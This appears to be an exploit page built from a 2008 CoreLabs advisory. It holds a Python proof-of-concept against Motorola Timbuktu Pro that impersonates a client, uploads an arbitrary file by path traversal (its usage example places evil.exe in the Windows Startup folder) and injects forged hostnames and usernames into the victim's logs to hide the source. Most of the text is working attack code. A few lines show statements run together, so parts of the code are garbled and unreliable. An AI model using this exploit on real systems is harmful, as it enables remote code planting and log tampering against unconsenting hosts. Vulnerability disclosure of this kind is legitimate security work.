Motorola Timbuktu Pro 8.6.5/8.7 Path Traversal / Log Injection Exploit
======================================================================

# Core Security Technologies - CoreLabs Advisory
#  http://www.coresecurity.com/corelabs

# Title: Timbuktu Pro Remote Path Traversal and Log Injection
# Advisory ID: CORE-2008-0204
# Advisory URL: http://www.coresecurity.com/?action=item&id=2166
# Date published: 2008-03-11
# Date of last update: 2008-03-11
# Vendors contacted: Motorola
# Release mode: Forced release

#  Proof of concept code follows. This PoC allows a remote attacker to
# upload a file to an arbitrary location on the victim&#039;s machine and forge
# peer information on the log lines of the victim&#039;s application.

from sys        import argv
from socket     import *
from struct     import pack

#from utils      import printFormatted
#from time import sleep

init_send_op_packet =   (   &#039;\x00\x01\x60\x00\x00\x52\x00\x25&#039;
                            &#039;\x00\x22\x02\x01\x00\x04\x03\x07&#039;
                            &#039;\x00\x05\x00\x01\x00\x00\x00\xf1&#039;
                            &#039;\x06\x00\xf7\x76\xdd\x77\x00\x00&#039;
                            &#039;\x00\x00\x08\x7c\x67\x60\x00\x00&#039;
                            &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
                            &#039;\x00\x00\x18\xf1\x06\x00\xd1\x90&#039;
                            &#039;\xbc\x60\x38\xf1\x06\x00\x32\x94&#039;
                            &#039;\xc1\x60\x50\x92\xc4\x60\x00\x00&#039;
                            &#039;\x00\x00\x18\x92\xc4\x60\x2d\xbe&#039;
                            &#039;\x80\x7c\x08\x7c\x67\x60\x20\x46&#039;
                        )

second_send_op_packet  = (  &#039;\x00\x01\x61\x00\x00\x52\x00\x25&#039;
                            &#039;\x00\x22\x02\x01\x00\x04\x03\x07&#039;
                            &#039;\x00\x05\x00\x01\x10\x00\xe0\xf0&#039;
                            &#039;\x06\x00\x51\x05\x91\x7c\x28\x09&#039;
                            &#039;\x08\x00\x6d\x05\x91\x7c\x1c\xf1&#039;
                            &#039;\x06\x00\x02\x00\x00\x00\x10\x00&#039;
                            &#039;\x00\x00\xb8\xf5\xbe\x60\x00\x00&#039;
                            &#039;\xac\x00\x00\x00\x00\x00\xbd\xf5&#039;
                            &#039;\xbe\x60\x30\x90\xc4\x60\x07\x00&#039;
                            &#039;\x00\x00\xd0\x13\x63\x60\x71\xfb&#039;
                            &#039;\x90\x7c\x40\xf0\x06\x00\x0e\x00&#039;
                            )

peer_info_exchange      = ( &#039;\x00\x01\x62\x00\x00\xb0\x00\x23&#039;
                            &#039;\x07\x22\x03\x07\x70\x2c\xa5\x51&#039;
                            &#039;\x4c\xca\xe3\xfb\x70\x2c\xa5\x51&#039;
                            &#039;\x4c\xca\xe3\xfb\x00\x09&#039;
                            &#039;%(user_name)s&#039;
                            &#039;\x01\x97&#039;
                            &#039;%(host_name)s&#039;
                            &#039;&#039;
                            &#039;\x00\x00\x01\x02\x00\x04&#039;
                            &#039;\xb1\x1c\x39\x51\x00\x00\x00\x00&#039;
                            &#039;%(guest_ip_address)s&#039;
                            &#039;\x00\x00\x00\x00\x00\x00&#039;
                            &#039;\x00\x00\x00\x00\x00\x00&#039;
                            )

ack_peer_info           =   &#039;\xff&#039;

attach_info_packet      = (&#039;\xfb\x00\x00\x00\x00&#039;
                            &#039;BINAmdos&#039;
                            &#039;\xc2\x12\x49\xaf\xbd\x35\xac\x98&#039;
                            &#039;\x00\x00\x00\x00&#039;
                            &#039;%(attachment_length)s&#039;
                            &#039;\x00\x00\x00\x00&#039;
                            &#039;\xff\xff\xff\xff\x00\x00\x00\x00&#039;
                            &#039;\x00\x00\x00\x00\x00\x00\x00\x00&#039;
                            &#039;\x00\x00\x00\x00\x00\x00&#039;
                            &#039;%(attachment_filename)s&#039;
                            )

attach_info_ack1        =  &#039;\xf9\x00&#039;

# Transfer file content here !!!
# \xF8 + 2 byte length + data

attach_file_ack1      =  &#039;\xf7&#039;

attach_file_ack2      =  &#039;\xfa&#039;


class Tb2FileSender:
    &#039;&#039;&#039;
    Fake timbuktu client that implements the &#039;Notes&#039; feature to send a
    message with a file attached to it.
    &#039;&#039;&#039;

    def __init__(self, target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content):
        &#039;&#039;&#039;
        Setup TCP Connection to standard port TCP/407
        &#039;&#039;&#039;
        self.sck = socket(AF_INET, SOCK_STREAM)
        self.sck.connect((target, 407))
        self.fake_src_ip    = fake_src_ip
        self.fake_hostname  = fake_hostname     # Peer computer name
        self.fake_username  = fake_username     # Peer user name
        self.dest_filename  = dest_filename     # Destination filename including path (like ../../a.exe)
        self.file_content   = file_content      # Content of the destination file

    def sendAndRecv(self, packet, log, expected_response_length=0x500, print_response=False):
        self.sck.send(packet)
        if log:
            print &#039;[-] %s&#039; % log
        if expected_response_length > 0:
            resp = self.sck.recv(expected_response_length)
            if print_response:
                #printFormatted(resp)
                print &#039;-&#039; * 70 + &#039;\n&#039;
            return resp
        return None

    def getPascalString(self, str):
        &#039;&#039;&#039;
        Format the strings as 1 Byte Length + String.
        &#039;&#039;&#039;
        return pack(&#039;B&#039;, len(str)) + str

    def createFakePeerInfoPacket(self):
        &#039;&#039;&#039;
        Create a packet with forged guest information to avoid giving away
        real info in the log files.
        &#039;&#039;&#039;
        #
        # Ohhh... by the way, these two names goes diretly to the log file... ehehhee  :) 
        #
        guest_host_name      = self.fake_hostname.replace(&#039;\\n&#039;, &#039;\r\n&#039;)
        guest_user_name      = self.fake_username.replace(&#039;\\n&#039;, &#039;\r\n&#039;)

        username_max_len     = 0x37 # This is not the application real limit,
        hostname_max_len     = 0x3f #   but it is the limit for this packet.

        host_name            = self.getPascalString(guest_host_name)
        user_name            = self.getPascalString(guest_user_name)

        # Pad the string to fill the empty space and avoid packet length recalculation
        host_name           += (&#039;\x00&#039; * (hostname_max_len - len(guest_host_name)))
        user_name           += (&#039;\x00&#039; * (username_max_len - len(guest_user_name)))

        guest_ip_address     = self.fake_src_ip.split(&#039;.&#039;)
        guest_ip_address     = pack(&#039;BBBB&#039;, int(guest_ip_address[0]), int(guest_ip_address[1]), int(guest_ip_address[2]), int(guest_ip_address[3]))

        return peer_info_exchange % vars()

    def getAttachContent(self):
        &#039;&#039;&#039;
        Retrieve the content of the local file and send it as the attach content.
        &#039;&#039;&#039;
        fd      = open(self.file_content, &#039;rb&#039;)
        data    = fd.read()
        fd.close()
        return data

    def send(self):
        &#039;&#039;&#039;
        Send a sequence of packet to upload our data to the filename and path
        specified by the user&#039;s parameters.
        &#039;&#039;&#039;

        # Begin protocol negotiation with the target
        self.sendAndRecv(init_send_op_packet,               &#039;Note Operation initial packet sent.&#039;)
        self.sendAndRecv(second_send_op_packet,             &#039;Note Operation negotiation packet sent.&#039;)

        # Send the packet with our fake info to fool the logs  :) 
        self.sendAndRecv(self.createFakePeerInfoPacket(),   &#039;Peer info packet sent.&#039;)
        self.sendAndRecv(ack_peer_info,                     &#039;Ack peer info packet sent.&#039;)

        # Setup attachment packets that contain information about the file being transfered
        max_trx_chunk_size  = 0x5B4
        trx_until_resync    = 0x16C5

        payload             = self.getAttachContent()
        payload_length      = len(payload)
        attachment_length   = pack(&#039;>L&#039;, payload_length)

        #
        # Send info about the attachment.
        #
        # The &#039;\&#039; character is nedded to bypass the application filter.
        # This is actually the Bug !
        attachment_filename  = self.getPascalString(&#039;\\&#039; + self.dest_filename.replace(&#039;\\&#039;, &#039;/&#039;))

        attach_info          = attach_info_packet % vars()

        self.sendAndRecv(attach_info     ,   &#039;Attachment info sent.&#039;)
        self.sendAndRecv(attach_info_ack1,   &#039;Attachment intermediate info sent.&#039;)

        attachment_content   = list()

        # We check if the data to send fits into one set of chunks.
        if payload_length < max_trx_chunk_size:
            attachment_content.append(&#039;\xF8&#039; + pack(&#039;>H&#039;, payload_length) + payload)
        else:
            # If the data is bigger than one chunk, then send multiple chunks and their headers.
            curr_pos        = 0     # keeps our current position into the data file content
            resync_chunk    = True  # flag to indicate if a new set of chunk should be set
            pos_in_chunk    = 0     # keeps our position into the current chunk set
            do_recv         = False # flag to indicate if recv is needed to receive target data

            while curr_pos <= payload_length:
                do_recv      = False
                # Is this the last chunk ?
                if curr_pos > 0 and pos_in_chunk != trx_until_resync:
                    # If it is the last chunk, then just set length to the rest of the data
                    if trx_until_resync - pos_in_chunk < max_trx_chunk_size:
                        chunk_length = trx_until_resync - pos_in_chunk
                        do_recv = True
                    else:
                        # Otherwise, set the data length as usual because it&#039;s an intermediate chunk
                        chunk_length = max_trx_chunk_size data         = &#039;&#039;
                else:
                    # Start a new set of chunks and check if this is not the last set
                    # If it is, then don&#039;t set the maximun size, just the rest of the length.
                    data         = &#039;\xF8&#039;   # Set the chunk set header
                    if payload_length - curr_pos < trx_until_resync:
                        chunk_length = payload_length - curr_pos
                        data        += pack(&#039;>H&#039;, chunk_length)
                    else:
                        # This is not the last chunk, so we set the maximun size and begin
                        #   it transmittion.
                        chunk_length = max_trx_chunk_size
                        data        += pack(&#039;>H&#039;, trx_until_resync) pos_in_chunk = 0

                # Append the current chunk into a list to be sent later
                attachment_content.append((do_recv, data + payload[curr_pos : curr_pos + chunk_length]))
                curr_pos        += chunk_length
                pos_in_chunk    += chunk_length

        #
        # Send file content in small chunks
        #
        print &#039;[-] Beginning file transfer... (this may take some time)&#039;
        for chunk in attachment_content:
            if chunk[0]:
                do_recv = 0x500
            else:
                do_recv = 0
            self.sendAndRecv(chunk[1], &#039;&#039;, do_recv)
            #sleep(0.5)
        print &#039;[-] File transfer complete&#039;

        # Send the final ACKs to allow the program to create the remote file.
        self.sendAndRecv(attach_file_ack1,   &#039;Note body intermediate info sent.&#039;)
        self.sendAndRecv(attach_file_ack2,   &#039;Note body intermediate info sent.&#039;)

        # Close the connection here to avoid the program displaying any message
        self.sck.close()
        return


if __name__ == "__main__":
    if len(argv) != 7:
        print (r&#039;\nUsage:\n\n%s <target> <fake_source_ip> <fake_hostname> &#039;
                &#039;<fake_username> <dest_filename_with_path> <file2upload>\n\n&#039;
                &#039;Example:\n\n&#039;
                &#039;%s victim.com 1.2.3.4 trust.com yourAdmin "..\..\..\Documents And Settings\All Users\Start Menu\Programs\Startup\evil.exe" c:\payload.exe&#039; % (argv[0], argv[0]) )
    else:
        target          = argv[1]
        fake_src_ip     = argv[2]
        fake_hostname   = argv[3]
        fake_username   = argv[4]
        dest_filename   = argv[5]
        file_content    = argv[6]

        tb2 = Tb2FileSender(target, fake_src_ip, fake_hostname, fake_username, dest_filename, file_content)
        tb2.send()



